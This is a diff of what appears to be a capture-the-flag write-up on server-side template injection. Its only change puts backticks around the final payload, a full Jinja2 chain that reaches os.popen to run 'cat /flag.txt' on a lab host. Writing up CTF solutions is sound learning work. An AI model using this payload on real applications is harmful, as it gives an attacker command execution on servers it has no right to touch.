@@ -14,7 +14,7 @@ This is a sign it is vulnerable to `SSTI`
   ```
   
 - The final payload: <br>
-http://213.177.18.70:8005/?c={{request.application.__globals__.__builtins__.__import__(%27os%27).popen(%27cat%20/flag.txt%27).read()}}
+`http://213.177.18.70:8005/?c={{request.application.__globals__.__builtins__.__import__(%27os%27).popen(%27cat%20/flag.txt%27).read()}}`
 
 <br>
 
